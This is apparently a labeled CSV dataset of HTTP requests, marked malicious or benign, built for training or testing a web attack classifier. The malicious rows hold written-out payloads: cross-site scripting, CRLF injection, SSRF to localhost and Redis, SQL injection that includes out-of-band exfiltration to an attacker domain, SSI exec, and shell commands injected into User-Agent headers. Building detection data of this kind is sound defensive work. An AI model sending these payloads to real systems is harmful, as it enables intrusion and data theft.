label,text
malicious,"POST /api/v1/comment/new HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Content-Length: 168
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Referer: https://community.game-dev-forum.org/threads/20987

{""thread_id"":20987,""author"":""PixelNinja"",""user_comment"":""Great tips on game design! Worth checking this link: javascript:alert('XSS')""}"
malicious,"GET /media/images/2023/banner.jpg HTTP/1.1
Host: cdn-internal-edge.network
User-Agent: Wget/1.21.1
Accept: */*
Referer: https://resources.community.game-dev-forum.org/
Connection: keep-alive"
malicious,"POST /api/user/profile/update HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Content-Length: 192
User-Agent: curl/7.77.0

{""display_name"": ""matt_doe"", ""profile_website"": ""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029"", ""bio"": ""Web developer and coffee fan""}"
malicious,"POST /data/ingest HTTP/1.1
Host: api.media-streaming-center.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Connection: keep-alive
Pragma: no-cache

resource_endpoint=gopher://127.0.0.1:6379/_%20select%201"
benign,"POST /api/newUser/create HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer NpjE75uGm5XM9GtMy0xb7ZKXSbV3opfr
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Content-Length: 206
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<User>
  <Username>josephine.r</Username>
  <Email>josephine.r@secure-user-portal.net</Email>
  <FirstName>Josephine</FirstName>
  <LastName>Reynolds</LastName>
  <Preferences>
    <Newsletter>true</Newsletter>
    <TwoFactorAuth>false</TwoFactorAuth>
  </Preferences>
</User>"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Debug-Options: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydChkb2NjdW1lbnQuZG9tYWluKTwvc2NyaXB0Pg==""></iframe>
Cookie: session_token=NzQ1ZWE4ZjYxMTNlNzEyNjIyYWQ1ZmQ3
Connection: keep-alive"
malicious,"GET /api/v3/items/search%0d%0aSet-Cookie:%20session=evil123%0d%0a%0d%0a<script>document.location='http://malicious.cloud'</script> HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Referer: https://dashboard.cloud-data-services.ai/app
Connection: close"
benign,"GET /api/v1/devices?status=active&filter=%4a%5b%6c%7d HTTP/1.1
Host: iot-management-cloud.net
User-Agent: curl/7.68.0
Accept: application/json
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: nextra-cloud-services.biz
User-Agent: ScanTrackBot/0.9b
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"GET /media/library?genre=drama&genre=thriller&year=2023&year=2022 HTTP/1.1
Host: scifi-horizon.info
User-Agent: python-requests/2.31.0
Accept: application/json
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"GET /sitemap_index.xml HTTP/1.1
Host: cityscape-architects.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Accept: text/xml
Accept-Language: en-US,en;q=0.8
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"POST /auth/login HTTP/1.1
Host: enterprise-it-solutions.us
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Accept: application/json
X-CSRF-Token: 8a14f65192f5b3d8e0645d945ab2f5a4
User-Agent: python-requests/2.28.2
Connection: keep-alive

username=tech_admin&password=AdminPass@2024&callback=%2Fportal%2Fhome%3Fwelcome%3Dtrue"
benign,"POST /news/interview/980/comment HTTP/1.1
Host: global-tech-trends.io
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Referer: https://global-tech-trends.io/news/interview/980
Connection: close

author_name=&comment_text=Very+insightful+interview.+Looking+forward+to+more+industry+updates."
malicious,"GET /api/photos/fetch?src=https%3A%2F%2Fcdn.photoshots.lightingnet.io%2Fpreview.jpg&src=http%3A%2F%2F127.0.0.1%3A8000%2Fsecret&mode=default HTTP/1.1
Host: asset-delivery.lightingnet.io
User-Agent: Python-urllib/3.8
Accept-Encoding: deflate, gzip
Origin: https://photos.lightingnet.io"
benign,"PUT /api/v4/sessions/287649/token HTTP/1.1
Host: api.online-retail-store.biz
Authorization: Bearer zXc123Qwe456Plm890AoPqRstU
Origin: https://www.online-retail-store.biz
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Connection: keep-alive
Content-Length: 51

{""sessionExpiry"":""2024-12-31T23:59:59Z"",""keepAlive"":true}"
benign,"GET /forum/thread/view?id=topic-94e2f5e1b2 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /account/create HTTP/1.1
Host: fresh-start-network.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: https://fresh-start-network.org
Referer: https://fresh-start-network.org/account/register
Connection: keep-alive
Cookie: sessionid=ab23cd45ef67gh89ij01kl23mn45op67

username=marissa_green&email=marissa.green%40freshstart.org&password=Passw0rd%21&password_confirm=Passw0rd%21&terms_accepted=true"
benign,"GET /svg/buttons/btn-close.svg HTTP/1.1
Host: my-personal-blog-site.info
Accept: image/svg+xml,image/*;q=0.8
User-Agent: curl/7.83.1
Referer: https://my-personal-blog-site.info/blog/article/view/123
Connection: keep-alive"
benign,"POST /user/account/request_password_reset HTTP/1.1
Host: connect-cloud-services.dev
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
X-Request-ID: 7f84a2d1-3fce-4d65-a5b8-605bce93bb81
Content-Length: 48
Connection: keep-alive

{""email"":""hannah.brewster@connect-cloud-services.dev""}"
benign,"GET /products/electronics/laptops/ultrabook-x9/details HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: sessionId=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.X7JN9smJLiBi4BDQFvO8O8RHz_64YU-gh0TnbiIb0oQ
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Connection: keep-alive"
benign,"PATCH /api/user/4567/profile-settings HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer u82hd3kqlj24mgo1xpr
Content-Type: application/json-patch+json
Accept: application/json, text/plain, */*
User-Agent: python-requests/2.31.0
Connection: keep-alive
Accept-Language: en-US,en;q=0.8

[
  {""op"": ""test"", ""path"": ""/language"", ""value"": ""en""},
  {""op"": ""replace"", ""path"": ""/language"", ""value"": ""fr""},
  {""op"": ""add"", ""path"": ""/features/betaUser"", ""value"": true}
]"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: marketing-bright-campaigns.org
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Via: 1.1 varnish
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
malicious,"GET /search/query%0d%0aX-Custom-Injected:payload%0d%0aContent-Length:%2029%0d%0a%0d%0a<script>evil()</script>extra HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Referer: https://portal.cloud-data-services.ai/home
Connection: keep-alive"
malicious,"PUT /api/users/profile HTTP/1.1
Host: enterprise-cloud-sync.io
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
X-CSRF-Token: d0328fa6d2e94e1e85f4b793cb1a777e
Origin: https://enterprise-cloud-sync.io
Accept-Language: en-US,en;q=0.9
Content-Length: 106

{""username"":""testuser"",""email"":""test@user.com"",""Is_Admin"":true,""plan_id"":""free""}"
benign,"GET /docs/api/v3/reference#endpoints HTTP/1.1
Host: nextgen-cloud-platform.ai
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: python-requests/2.31.0
Cache-Control: no-cache
Connection: keep-alive"
malicious,"GET /blog/article/<iMg SrC=x OnErRoR=alert(new%20Date())>/comments HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /user/login HTTP/1.1
Host: portal-digital-space.tech
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://portal-digital-space.tech
Referer: https://portal-digital-space.tech/login
Cookie: session=xyz789qwerty; csrf_token=b94e69c31a
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0

username=emily.santos&password=MyP@ssword123"
malicious,"GET /shop/item/details?search_term=electronics%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: shopfast-delivery.shop
Connection: close
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: br, gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Cookie: SESSIONID=3b9f6b26e0a44dd8abb2cc1a56945cd0; lang=pref_en"
benign,"POST /submit/comment HTTP/1.1
Host: forum.creative-sparks.community
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://forum.creative-sparks.community/thread/98765
Connection: close
Cookie: sessionid=7d2b49e7f68470a7cef64ea4ae59b2f1; preference=lang%3Den

username=crafty_user&comment=Loved+the+tips+in+this+post%21+Looking+forward+to+more+%26+learning+new+techniques%23art&notify_reply=yes"
malicious,"GET /resources/data?ref=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.attacker-domain.com%255C%255Cdata%2527%2529%2529%2529--%2520 HTTP/1.1
Host: enterprise.analytics-solutions.co
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ANID=1234a5b6c7d8e9f0g1h2
Referer: https://enterprise.analytics-solutions.co/dashboard"
benign,"GET /static/scripts/v1/main.js HTTP/1.1
Host: green-energy-resources.co.uk
Accept: application/javascript, text/javascript, */*
Referer: https://green-energy-resources.co.uk/blog/solar-power-benefits
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /user/profile/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) `id`
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Length: 27
Cookie: sessionid=4f8b9a7c2f3d1e6a

bio=Just+a+regular+user&lang=en"
benign,"POST /user/register HTTP/1.1
Host: online-fitness-club.co.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: https://online-fitness-club.co.uk
Referer: https://online-fitness-club.co.uk/register
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Cookie: session=abcd1234efgh5678ijkl90
Cache-Control: no-cache
Connection: keep-alive

username=emma_wilson&email=emma.wilson%40fitclub.co.uk&password=Fit4Life$2023&password_confirm=Fit4Life$2023&terms_accepted=true"
benign,"POST /api/v2/documents/multi-upload HTTP/1.1
Host: secure-doc-storage.net
Content-Type: multipart/form-data; boundary=----MyBoundary123456789
Content-Length: 612
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/plain, */*
X-CSRF-Token: G7b5m9HkQ21qN5jU
Referer: https://secure-doc-storage.net/dashboard/upload
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

------MyBoundary123456789
Content-Disposition: form-data; name=""report_file""; filename=""Q1_Financial_Report.pdf""
Content-Type: application/pdf

<binary pdf data>
------MyBoundary123456789
Content-Disposition: form-data; name=""summary_file""; filename=""Summary.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

<binary docx data>
------MyBoundary123456789
Content-Disposition: form-data; name=""supplementary_file""; filename=""data_sheet.xlsx""
Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet

<binary xlsx data>
------MyBoundary123456789--"
benign,"OPTIONS /v1/catalog/items HTTP/1.1
Host: api.vividmedia-marketplace.io
Origin: https://sellerportal.m-commerce.biz
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"PUT /api/v2/reports/user_activity_20240620.dat HTTP/1.1
Host: analytics-data-harvest.ai
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Content-Type: application/octet-stream
Content-Length: 210
X-Forwarded-For: 66.249.66.1
Accept-Encoding: gzip
Connection: keep-alive

VGhpcyBmaWxlIGNvbnRhaW5zIGJhc2U2NC1lbmNvZGVkIHVzZXIgYWN0aXZpdHkgcmVwb3J0IGRhdGEuIFRoaXMgaXMgdXNlZCBmb3IgewogICJ1c2VycyI6IDMxMjMsCiAgImxvZ2lucyI6IDIwNTYsCiAgImFjdGl2aXRpZXMiOiAxNTQ0LAogICJsb2dnZWRBdCI6ICIyMDIyLTA2LTIwIDE1OjIwOjAwIgogfQ=="
benign,"PUT /v1/orders/413279/update HTTP/1.1
Host: api.quickshop-online.biz
Authorization: Bearer a57d9d70c8e61c3f3d9bbc8f494729ea
Content-Type: application/json
Accept: application/json
Origin: https://checkout.quickshop-online.biz
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Content-Length: 91
Connection: close

{""shippingAddress"":{""city"":""Richmond"",""zipcode"":""23230"",""street"":""431 Maple Avenue"",""country"":""US""},""priority"":""express""}"
benign,"GET /assets/webfonts/montserrat-black.woff2 HTTP/1.1
Host: smart-learning-platform.edu
Connection: keep-alive
Accept: font/woff2,*/*;q=0.9
Referer: https://smart-learning-platform.edu/css/theme.css
Origin: https://smart-learning-platform.edu
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
benign,"GET /assets/webfonts/opensans-bold.woff2 HTTP/1.1
Host: global-design-hub.net
Accept: font/woff2,application/font-woff2;q=0.9,*/*;q=0.8
Referer: https://global-design-hub.net/styles/main.css
Origin: https://global-design-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: keep-alive"
malicious,"GET /public/site.shtml?template_name=default<!--#exec cmd=""/bin/uname -a""--> HTTP/1.1
Host: portal-dev-services.net
User-Agent: Lynx/2.8.9dev.15 libwww-FM/2.14
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Charset: UTF-8,ISO-8859-1;q=0.5
Cache-Control: no-cache
Connection: keep-alive"
malicious,"GET /app/user_settings?search=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: portal-tradecloud.io
Connection: keep-alive
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-CA,en;q=0.7
Referer: https://portal-tradecloud.io/home
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
benign,"OPTIONS /api/user/settings HTTP/1.1
Host: user-preferences.cloud-hosting.dev
Origin: https://settings.webmail-suite.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: X-CSRF-Token, Accept
User-Agent: curl/7.83.1
Accept: */*
Connection: close"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: marketplace-pro-finder.net
User-Agent: MarketBot/1.2 $(ls -la /var/www)
Content-Type: application/json
Accept: application/json
Sec-CH-UA: ""Chromium"";v=""94"", ""Google Chrome"";v=""94"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Content-Length: 32

{""search"":""laptop"",""limit"":5}"
benign,"POST /api/payments/make HTTP/1.1
Host: secure-payments-api.store
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.LkC-6l.OixNpZaDtLBQZyvR
Content-Type: application/json
Accept: application/json
Origin: https://secure-payments-api.store
X-Requested-With: FetchAPIClient
X-CSRF-Token: cb179d23d7a646db8f01
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36

{""orderId"": 7774, ""paymentMethod"": ""paypal"", ""amount"": 59.99}"
benign,"POST /api/v2/support/tickets/new HTTP/1.1
Host: helpdesk.techbridge-solutions.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Accept-Language: en-gb,en;q=0.8
Referer: https://helpdesk.techbridge-solutions.ai/support
Cookie: sessionid=fd827cbb9ef3ab361d2a2ab9918891e7
Connection: keep-alive

userId=83219&issueType=general&message=VGhpcyBpc3N1ZSB3YXMgcmVzb2x2ZWQgc3VjY2Vzc2Z1bGx5Lg==&priority=medium"
benign,"GET /products/kitchen/blenders/elite-model HTTP/1.1
Host: modern-kitchenware.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml
Cache-Control: max-age=0
Connection: keep-alive"
